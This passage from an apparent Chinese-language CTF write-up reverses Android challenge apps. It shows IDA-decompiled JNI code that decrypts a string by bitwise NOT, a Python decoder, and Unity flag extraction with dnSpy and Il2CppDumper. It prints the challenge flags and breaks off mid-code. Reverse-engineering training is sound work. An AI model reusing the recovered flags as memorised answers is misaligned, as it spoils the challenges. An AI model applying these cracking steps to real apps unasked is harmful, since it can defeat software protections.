class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_110B0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>    ...<br>  v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="hljs-number">676</span>))(a1, a3, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( v3 )<br>  &#123;<br>    v4 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v3;<br>    v5 = <span class="hljs-built_in">strlen</span>(v3);<br>    v6 = (_BYTE *)operator new[](v5 + <span class="hljs-number">1</span>);<br>    v7 = v5;<br>    v8 = v6;<br>    <span class="hljs-keyword">if</span> ( !v7 )<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    v9 = <span class="hljs-number">0</span>;<br>    v24 = v7;<br>    <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">8</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v8 &lt; v4 + v7 &amp;&amp; v4 &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;v8[v7] )<br>      <span class="hljs-keyword">goto</span> LABEL_17;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">0x20</span> )<br>    &#123;<br>LABEL_14:<br>      v17 = v9;<br>      v9 = v7 &amp; <span class="hljs-number">0xFFFFFFF8</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        *(_QWORD *)&amp;v8[v17] = _mm_xor_si128(_mm_loadl_epi64((<span class="hljs-type">const</span> __m128i *)(v4 + v17)), (__m128i)<span class="hljs-number">-1LL</span>).m128i_u64[<span class="hljs-number">0</span>];<br>        v17 += <span class="hljs-number">8</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v9 != v17 );<br>      <span class="hljs-keyword">if</span> ( v7 != v9 )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>LABEL_21:<br>      v8[v7] = <span class="hljs-number">0</span>;<br>      v25 = <span class="hljs-built_in">memcmp</span>(v8, &amp;unk_78FD, v7) == <span class="hljs-number">0</span>;<br>      v20 = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_DWORD *)a1 + <span class="hljs-number">24</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>      v21 = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_DWORD *)a1 + <span class="hljs-number">132</span>))(a1, v20, <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>, <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>      v22 = _JNIEnv::NewObject(a1, v20, v21, v25);<br>      (*(<span class="hljs-type">void</span> (__cdecl **)(<span class="hljs-type">int</span>))(*(_DWORD *)a1 + <span class="hljs-number">680</span>))(a1);<br>      operator delete[](v8);<br>      <span class="hljs-keyword">return</span> v22;<br>    &#125;<br>    v9 = v7 &amp; <span class="hljs-number">0xFFFFFFE0</span>;<br>    v10 = (v7 &amp; <span class="hljs-number">0xFFFFFFE0</span>) - <span class="hljs-number">32</span>;<br>    v11 = (v10 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v10 )<br>    &#123;<br>      v12 = v11 &amp; <span class="hljs-number">0xFFFFFFFE</span>;<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v14 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">16</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">16</span>] = v14;<br>        v15 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">48</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">32</span>] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">32</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">48</span>] = v15;<br>        v13 += <span class="hljs-number">64</span>;<br>        v12 -= <span class="hljs-number">2</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v12 );<br>      <span class="hljs-keyword">if</span> ( (v11 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( (v11 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>    &#125;<br>    v16 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">16</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v13] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13)), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v13 + <span class="hljs-number">16</span>] = v16;<br>LABEL_12:<br>    v7 = v24;<br>    <span class="hljs-keyword">if</span> ( v24 == v9 )<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    <span class="hljs-keyword">if</span> ( (v24 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>    &#123;<br>LABEL_17:<br>      v18 = v7 + ~v9;<br>      <span class="hljs-keyword">for</span> ( i = v7 &amp; <span class="hljs-number">3</span>; i; --i )<br>      &#123;<br>        v8[v9] = ~*(_BYTE *)(v4 + v9);<br>        ++v9;<br>      &#125;<br>      v7 = v24;<br>      <span class="hljs-keyword">if</span> ( v18 &gt;= <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v8[v9] = ~*(_BYTE *)(v4 + v9);<br>          v8[v9 + <span class="hljs-number">1</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">1</span>);<br>          v8[v9 + <span class="hljs-number">2</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">2</span>);<br>          v8[v9 + <span class="hljs-number">3</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">3</span>);<br>          v9 += <span class="hljs-number">4</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v24 != v9 );<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_14;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先用 <code>v5</code> 存储调用 <code>(*(_QWORD *)a1 + 1352LL)</code> 所返回的字符串，<code>v6</code> 指向指向 <code>v5</code>，然后 <code>v8</code>来存储字符串</p><p>而且代码根据字符串长度进行不同的解密处理：</p><ul><li><strong>长度小于 8 的情况</strong>，逐字节进行按位<strong>取反</strong></li><li><strong>长度大于或等于 8 小于 32 的情况</strong>，利用 <strong><code>_mm_xor_si128</code></strong> 进行 8 字节为单位的批量解密</li><li><strong>长度大于或等于 32 的情况</strong>，一次处理 64 字节<ul><li>**<code>_mm_xor_si128</code>**：通过向量化操作，将 16 字节数据与 <code>-1</code> 进行异或，相当于每个字节都执行 <code>~</code> 操作（按位取反）</li></ul></li></ul><p>代码中有一句 <code>v12 = memcmp(v8, &amp;unk_DCF0, v7) == 0</code>，主要作用是通过 <strong><code>memcmp</code></strong> 函数比较两个内存区域的内容是否相等，那么 <code>v5</code> 中的字符串就存储在 <code>unk_DCF0</code> 中，提取出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/52d5d49ec7b27e07.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x99</span>, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>xB1, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x88, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xA6, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x8A, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xB4, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x88, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xB1, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x9B, <span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x92, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x9C, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x8C, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x82<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">ida_chars = [<br>    <span class="hljs-number">0x99</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xA6</span>,<br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA0</span>,<br>    <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9A</span>,<br>    <span class="hljs-number">0x98</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>,<br>    <span class="hljs-number">0x82</span><br>]<br><br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(~byte &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ida_chars)<br><span class="hljs-built_in">print</span>(decrypted_string)<br><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Now_You_Know_Native_real_dynamic_registration&#125;<br></code></pre></td></tr></table></figure><h1 id="GAME-level5"><a href="#GAME-level5" class="headerlink" title="GAME-level5"></a>GAME-level5</h1><p>Jeb 打开发现了关于 Unity 的东西，猜测这个程序估计是用 Unity 写的</p><p><img src="https://img.dkdun.cn/v1/2025/12/f1df02fcb69e0554.png"></p><p>把 <code>\assets\bin\Data\Managed\</code> 下的 <code>Assembly-CSharp.dll</code>  文件丢进 dnSpy 看看，在 <code>GameWindow</code> 找到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/336e506c9ec7a7de.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;justaeasyunitygame&#125;<br></code></pre></td></tr></table></figure><h1 id="GAME-level6"><a href="#GAME-level6" class="headerlink" title="GAME-level6"></a>GAME-level6</h1><p>第一次见这个东西，还挺新奇hhhhh</p><p>发现有一个 Mono 文件夹 </p><p><img src="https://img.dkdun.cn/v1/2025/12/338a59f0d8c91616.png"></p><p>Unity 使用 Mono 方式打出来的 apk，如果没有加密我们可以直接从包内拿到 <code>Assembly-CSharp.dll</code>，可以直接使用 <code>dnSpy.exe </code>对其进行反编译。<br>如果使用 <code>IL2CPP</code> 方式出包，则没有 <code>Assembly-CSharp.dll</code>，有一个 <code>IL2CppDumper</code> 工具，<a href="https://github.com/Perfare/Il2CppDumper%EF%BC%8C%E9%80%9A%E8%BF%87%E5%AE%83%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%86%E5%90%91%E5%BE%97%E5%88%B0">https://github.com/Perfare/Il2CppDumper，通过它，我们可以逆向得到</a> <code>Assembly-CSharp.dll</code></p><p>创建一个 <code>input</code> 和 <code>output</code>，将 <code>libil2cpp.so</code> 与 <code>global-metadata.dat</code> 拷贝到 <code>input</code> 目录中，</p><p><img src="https://img.dkdun.cn/v1/2025/12/acef11ddd1eea039.png"></p><p>可以创建一个批处理文件到 <code>input</code></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">..\Il2CppDumper.exe libil2cpp.so global-metadata.dat ..\output<br></code></pre></td></tr></table></figure><p>环境 <code>.NET</code> 需要用 <code>6.0.0</code> 版本</p><p><img src="https://img.dkdun.cn/v1/2025/12/77a2c254193111c4.png"></p><p>然后打开这个 <code>.dll</code> 文件发现有一个 <code>FlagText</code>，但是是没有内容的</p><p><img src="https://img.dkdun.cn/v1/2025/12/ff917dbc6e5c5c71.png"></p><p>打开 <code>libil2cpp.so</code> ,加载 IL2CppDumper 文件夹里的 ida_py3.py 文件把 dump 出来的 script.json 加载进去,<code>FlagText</code> 偏移值为 <code>0x40</code>，在 ida 里面跳转，可以看到有 Flags 字样，但是还是什么都没有</p><p>查看 <code>LoadLevel</code> 函数，加载到了 <code>UnityEngine_Transform__SetParent_8767024</code> 函数，但是我 ida 后面加载不出来了，唉唉唉</p><h1 id="Init-Array-level7"><a href="#Init-Array-level7" class="headerlink" title="Init_Array-level7"></a>Init_Array-level7</h1><p>看源码，调用了 <code>native</code> 层 <code>Check</code>，因此就应该去分析 <code>.so</code> 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.swdd.summertrain;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> com.swdd.summertrain.databinding.ActivityMainBinding;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> ActivityMainBinding binding;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;summertrain&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Boolean <span class="hljs-title function_">Check</span><span class="hljs-params">(String arg1)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View V)</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.Check(((TextView)<span class="hljs-built_in">this</span>.findViewById(id.input)).getText().toString()).booleanValue()) &#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Good!&quot;</span>, <span class="hljs-number">0</span>).show();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Try Again&quot;</span>, <span class="hljs-number">0</span>).show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span>  <span class="hljs-comment">// androidx.fragment.app.FragmentActivity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-type">ActivityMainBinding</span> <span class="hljs-variable">activityMainBinding0</span> <span class="hljs-operator">=</span> ActivityMainBinding.inflate(<span class="hljs-built_in">this</span>.getLayoutInflater());<br>        <span class="hljs-built_in">this</span>.binding = activityMainBinding0;<br>        <span class="hljs-built_in">this</span>.setContentView(activityMainBinding0.getRoot());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>查看 <code>Java_com_swdd_summertrain_MainActivity_Check</code> 函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Java_com_swdd_summertrain_MainActivity_Check</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>  v3 = a3;<br>  v4 = <span class="hljs-number">0LL</span>;<br>  v5 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="hljs-number">1352LL</span>))(a1, a3, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v5 )<br>    <span class="hljs-keyword">return</span> v4;<br>  v6 = v5;<br>  v26 = v3;<br>  v7 = <span class="hljs-built_in">strlen</span>(v5);<br>  v8 = (<span class="hljs-type">char</span> *)<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](v7 + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( !v7 )<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">8</span> || v8 &lt; &amp;v6[v7] &amp;&amp; v6 &lt; &amp;v8[v7] )<br>  &#123;<br>    v9 = <span class="hljs-number">0LL</span>;<br>LABEL_7:<br>    v10 = v7 + ~v9;<br>    v11 = v7 &amp; <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">3</span>) != <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v8[v9] = ~v6[v9];<br>        ++v9;<br>        --v11;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v11 );<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v10 &gt;= <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v8[v9] = ~v6[v9];<br>        v8[v9 + <span class="hljs-number">1</span>] = ~v6[v9 + <span class="hljs-number">1</span>];<br>        v8[v9 + <span class="hljs-number">2</span>] = ~v6[v9 + <span class="hljs-number">2</span>];<br>        v8[v9 + <span class="hljs-number">3</span>] = ~v6[v9 + <span class="hljs-number">3</span>];<br>        v9 += <span class="hljs-number">4LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v7 != v9 );<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v7 &gt;= <span class="hljs-number">0x20</span> )<br>  &#123;<br>    v9 = v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>;<br>    v19 = (((v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>) - <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( (v7 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0LL</span>) == <span class="hljs-number">32</span> )<br>    &#123;<br>      v21 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( (v19 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v20 = v19 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFELL</span>;<br>      v21 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v22 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">16</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">16</span>] = v22;<br>        v23 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">48</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">32</span>] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">32</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v21 + <span class="hljs-number">48</span>] = v23;<br>        v21 += <span class="hljs-number">64LL</span>;<br>        v20 -= <span class="hljs-number">2LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v20 );<br>      <span class="hljs-keyword">if</span> ( (v19 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    v24 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21 + <span class="hljs-number">16</span>]), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v21] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)&amp;v6[v21]), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i 